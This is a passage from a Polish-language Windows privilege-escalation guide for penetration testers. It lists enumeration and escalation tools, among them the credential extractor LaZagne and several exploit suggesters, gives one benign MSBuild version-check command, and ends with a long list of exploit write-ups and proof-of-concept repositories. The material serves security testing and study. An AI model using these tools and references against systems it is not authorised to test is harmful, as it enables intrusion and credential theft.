[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia poświadczenia z wielu programów (skompilowany plik exe dostępny na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sprawdza błędne konfiguracje (skompilowany plik wykonywalny dostępny na github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do poprawnego działania nie potrzebuje accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje dane wyjściowe polecenia **systeminfo** i sugeruje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje dane wyjściowe polecenia **systeminfo** i sugeruje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt, używając odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić wersję .NET zainstalowaną na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows - ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - warsztaty lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień - Windows - kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacja uprawnień - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → ROP z VirtualAlloc (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – W pogoni za Silver Fox: kot i mysz w cieniach jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Luka w systemie plików z podwyższonymi uprawnieniami w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania łączy symbolicznych – użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie łączy symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Pułapki zaufania w Node.js: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Rozwiązane wyzwania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna prymitywa exploitowa odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie arbitralnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka lokalnej eskalacji uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Menedżera poświadczeń i Magazynu systemu Windows](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Ograniczona delegacja oparta na zasobach Kerberos: jak zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Wyodrębnianie kluczy prywatnych SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) – część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) – część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacja uprawnień przez usunięcie folderu Instalatora Microsoft Windows](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: odtworzenie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
